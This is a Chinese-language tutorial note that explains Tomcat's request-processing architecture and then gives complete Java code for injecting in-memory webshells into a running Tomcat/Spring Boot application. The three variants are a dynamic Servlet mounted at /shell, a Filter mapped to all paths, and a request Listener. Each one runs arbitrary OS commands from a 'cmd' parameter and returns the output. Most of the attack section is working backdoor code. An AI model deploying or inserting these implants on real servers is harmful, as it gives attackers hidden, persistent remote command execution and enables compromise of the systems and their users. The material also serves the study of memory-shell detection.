> springboot框架：负责依赖注入（IOC）、数据库映射、写 Controller（web接口）的业务逻辑。
>
> tomcat：负责监听端口（比如 8888）、接收原始的 HTTP 请求、解析协议、然后把请求交给对应的 Java 类处理。
>

# Tomcat架构：
> tomcat处理请求的流程大致为：`Listener -> Filter -> Servlet`
>

## 1.Server (服务器)
这是 Tomcat 的顶层组件，代表整个 JVM 虚拟机中的 Tomcat 实例。一个 Server 可以包含多个 Service。

## 2.Service (服务)
它是把 **Connector** 和 **Engine** 组合在一起的逻辑单元。它的存在是为了让 Engine 能够接收来自不同协议（如 HTTP 和 AJP）的请求。  

##  3.Connector (连接器)
负责监听端口（如 8080）。

接收 Socket 请求，将原始字节流解析为 Request 对象。

将解析好的 Request 交给 Engine 处理，并将 Engine 返回的结果发回给客户端。

## 4.Engine (引擎)
它是 Servlet 引擎的核心，负责处理由 Connector 传过来的请求。

它并不直接处理业务逻辑，而是将请求转发给对应的 Host（虚拟主机）。

## 5.容器结构 (Container)
Engine 内部又细分为四层容器，请求会层层向下传递：

1.Engine：最高层，管理多个虚拟主机。

2.Host (虚拟主机)：代表一个域名（如 localhost）。你可以在一个 Tomcat 运行多个域名的网站。

3.Context (应用上下文)：代表一个具体的 Web 应用（比如你部署的一个项目）。

4.Wrapper (封装器)：最底层，每个 Wrapper 对应一个具体的 Servlet 实例。

# 动态注入：
> 有所注入的攻击方式都是通过传入参数cmd进行远程RCE
>

## 1.servlet
原理：通过反射获取StandardContext，然后创建一个为攻击者所用的servlet。

用比喻的方法讲，创建一个servlet就是创建了一web接口，这个接口是挂载在Tomcat上，需要按照Tomcat的规则来。

通过反射获取StandardContext，也就是Context，它的作用就是管理每一个servlet，然后需要定义这个servlet的作用，比如RCE，然后每一个servlet都需要一个wrapper来封装，获取wrapper方法也需要通过反射，最后一步就是按上对应路由。

```java
@GetMapping("/servlet")
    public String injectServlet(HttpServletRequest request) {
        try {
            // 1. 全反射获取 StandardContext (这一步你之前已经很熟了)
            java.lang.reflect.Field requestField = request.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            Object innerRequest = requestField.get(request);
            Object standardContext = innerRequest.getClass().getMethod("getContext").invoke(innerRequest);

            // 2. 动态定义 Servlet (全部使用全限定类名，防止“无法解析符号”)
            javax.servlet.http.HttpServlet evilServlet = new javax.servlet.http.HttpServlet() {
                @Override
                protected void service(javax.servlet.http.HttpServletRequest req, javax.servlet.http.HttpServletResponse resp) {
                    try {
                        String cmd = req.getParameter("cmd");
                        if (cmd != null) {
                            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                                    ? new String[]{"cmd.exe", "/c", cmd}
                                    : new String[]{"/bin/sh", "-c", cmd};

                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";

                            resp.setCharacterEncoding("UTF-8");
                            resp.getWriter().write(output);
                        }
                    } catch (Exception e) {
                        // 内部异常也要抓，不然编译不通过
                    }
                }
            };

            // 3. 开始反射“动手术”
            String name = "proxyServlet-" + System.currentTimeMillis();

            // 反射调用 standardContext.createWrapper()
            java.lang.reflect.Method createWrapperMethod = standardContext.getClass().getMethod("createWrapper");
            Object newWrapper = createWrapperMethod.invoke(standardContext);

            // 反射设置 Wrapper 属性 (注意参数类型要匹配)
            newWrapper.getClass().getMethod("setName", String.class).invoke(newWrapper, name);
            newWrapper.getClass().getMethod("setLoadOnStartup", int.class).invoke(newWrapper, 1);
            newWrapper.getClass().getMethod("setServlet", javax.servlet.Servlet.class).invoke(newWrapper, evilServlet);
            newWrapper.getClass().getMethod("setServletClass", String.class).invoke(newWrapper, evilServlet.getClass().getName());

            // 4. 添加到当前 StandardContext 并绑定路由
            // 注意：addChild 的参数类型需要是 Container 接口
            java.lang.reflect.Method addChildMethod = standardContext.getClass().getMethod("addChild",
                    Class.forName("org.apache.catalina.Container"));
            addChildMethod.invoke(standardContext, newWrapper);

            java.lang.reflect.Method addMappingMethod = standardContext.getClass().getMethod("addServletMappingDecoded",
                    String.class, String.class);
            addMappingMethod.invoke(standardContext, "/shell", name);

            return "Pro版本注入成功！路径: /shell?cmd=whoami";

        } catch (Exception e) {
            e.printStackTrace();
            return "注入失败: " + e.toString();
        }
    }
```

## 2.filter
原理：通过反射获取StandardContext，然后重写一个恶意的filter

于servlet一样，都需要用到StandardContext

filter有三个方法：init() --初始化、doFilter() --每次收到请求就执行、destroy() --销毁，很显然，需要着重重写的是doFiter方法。

filter还有三个重要的属性：

filterDef：记录filter 的名称、类名以及实例对象

filterMap：规定了用户访问什么路径会触发这个filter

filterConfig：一个map key = filter名字，value = ApplicationFilterConfig对象，由于Tomcat不会自动创建ApplicationFilterConfig，需要通过反射调用来创建一个，然后塞进filterConfigs里。

```java
@GetMapping("/filter")
    public String injectFilter(HttpServletRequest request) {
        try {
            // 1. 获取 StandardContext (这部分逻辑和你之前的一样)
            java.lang.reflect.Field requestField = request.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            Object innerRequest = requestField.get(request);
            StandardContext standardContext = (StandardContext) innerRequest.getClass().getMethod("getContext").invoke(innerRequest);

            // 2. 定义恶意 Filter 逻辑
            Filter evilFilter = new Filter() {
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {}

                @Override
                public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws java.io.IOException, ServletException {
                    String cmd = request.getParameter("cmd");
                    if (cmd != null) {
                        // 如果有 cmd 参数，执行命令并直接返回结果
                        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
                        String result = s.hasNext() ? s.next() : "";
                        response.setCharacterEncoding("UTF-8");
                        response.getWriter().write("--- Filter Shell Result ---\n" + result);
                    } else {
                        // 没有命令，正常放行
                        chain.doFilter(request, response);
                    }
                }

                @Override
                public void destroy() {}
            };

            // 3. 创建 FilterDef (Filter 的定义)
            String name = "securityFilter";
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(evilFilter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(evilFilter.getClass().getName());
            standardContext.addFilterDef(filterDef);

            // 4. 创建 FilterMap (路径映射)
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(name);
            filterMap.addURLPattern("/*"); // 拦截所有路径
            // 将此 Filter 放在最前面
            standardContext.addFilterMapBefore(filterMap);

            // 5. 递归获取私有字段 filterConfigs
            Field configsField = null;
            Class<?> currentClass = standardContext.getClass();

            while (currentClass != null) {
                try {
                    configsField = currentClass.getDeclaredField("filterConfigs");
                    break; // 找到了就跳出循环
                } catch (NoSuchFieldException e) {
                    currentClass = currentClass.getSuperclass(); // 没找到就往父类找
                }
            }

            if (configsField == null) {
                return "注入失败：在类继承链中未找到 filterConfigs";
            }

            configsField.setAccessible(true);
            Map filterConfigs = (Map) configsField.get(standardContext);

            // 接下来的代码保持不变：调用 ApplicationFilterConfig 构造函数并 put 进去

            // 利用反射调用 ApplicationFilterConfig 的私有构造函数
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            // 塞进 Map，Filter 正式“上线”
            filterConfigs.put(name, filterConfig);

            return "Filter 注入成功！尝试访问任何路径并带上 ?cmd=whoami";

        } catch (Exception e) {
            e.printStackTrace();
            return "注入失败: " + e.getMessage();
        }
    }
```

## 3.listener
> 1.ServletContext (应用级别)
>
> 监听什么：整个 Web 应用的启动和关闭。
>
> 用途：这是最常用的注入点。当应用加载时执行初始化代码。
>
> 2.HttpSession (会话级别)
>
> 监听什么：用户登录（Session 创建）、用户退出（Session 销毁）、Session 属性改变。
>
> 用途：统计在线人数，或者在 Session 里塞东西。
>
> 3.ServletRequest (请求级别)
>
> 监听什么：每一个 HTTP 请求的到达和销毁。
>
> 安全价值：对于安全研究者来说，这个接口是最完美的内存马植入点之一。
>

原理：通过反射获取StandardContext，然后重写一个恶意的listener

listener的重写没有servlet和filter那样复杂，但是listener中只有request，没有response，需要通过反射来获取，然后写入response内容。

```java
@GetMapping("/listener")
public String injectListener(HttpServletRequest request) {
    try {
        // 1. 获取 StandardContext
        java.lang.reflect.Field requestField = request.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        Object innerRequest = requestField.get(request);
        // 注意：如果你在 Spring 环境下运行，可能需要导入 org.apache.catalina.core.StandardContext 或者使用 Object 接收
        Object standardContext = innerRequest.getClass().getMethod("getContext").invoke(innerRequest);

        // 2. 定义恶意 Listener
        ServletRequestListener evilListener = new ServletRequestListener() {
            @Override
            public void requestInitialized(ServletRequestEvent sre) {
                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                // 触发暗号：?cmd=xxx
                String cmd = req.getParameter("cmd");

                if (cmd != null && !cmd.isEmpty()) {
                    try {
                        // 执行命令逻辑
                        String[] cmds = (System.getProperty("os.name").toLowerCase().contains("win"))
                                ? new String[]{"cmd.exe", "/c", cmd}
                                : new String[]{"/bin/sh", "-c", cmd};

                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
                        String result = s.hasNext() ? s.next() : "";

                        // --- 反射获取 Response 对象 (核心回显步骤) ---
                        java.lang.reflect.Field reqField = req.getClass().getDeclaredField("request");
                        reqField.setAccessible(true);
                        Object catalinaRequest = reqField.get(req);
                        
                        // 获取内核 Response 对象
                        Object catalinaResponse = catalinaRequest.getClass().getMethod("getResponse").invoke(catalinaRequest);
                        
                        // 获取标准的 HttpServletResponse 接口 (使用 getResponse 或 getFacade 视版本而定)
                        javax.servlet.http.HttpServletResponse resp = (javax.servlet.http.HttpServletResponse) catalinaResponse.getClass().getMethod("getResponse").invoke(catalinaResponse);

                        // --- 直接回显到页面 ---
                        // 1. 设置内容类型（可选，防止乱码）
                        resp.setCharacterEncoding("UTF-8");
                        resp.setContentType("text/plain");

                        // 2. 获取 Writer 并写入结果
                        java.io.PrintWriter writer = resp.getWriter();
                        writer.write(result);
                        
                        // 3. 强制刷新并关闭流 (非常重要，这会告诉 Tomcat "我已经写完了，不用管后续了")
                        writer.flush();
                        writer.close();

                        // 这里不需要 return，因为方法已经结束，且流已关闭
                    } catch (Exception e) {
                        // 如果在 Listener 里报错，尽量不要抛出，否则会影响正常业务
                        e.printStackTrace();
                    }
                }
            }

            @Override
            public void requestDestroyed(ServletRequestEvent sre) {}
        };

        // 3. 注入
        standardContext.getClass().getMethod("addApplicationEventListener", Object.class).invoke(standardContext, evilListener);

        return "Listener 注入成功！现在访问任何页面带上 ?cmd=whoami 试试。";

    } catch (Exception e) {
        return "注入失败: " + e.getMessage();
    }
}
```







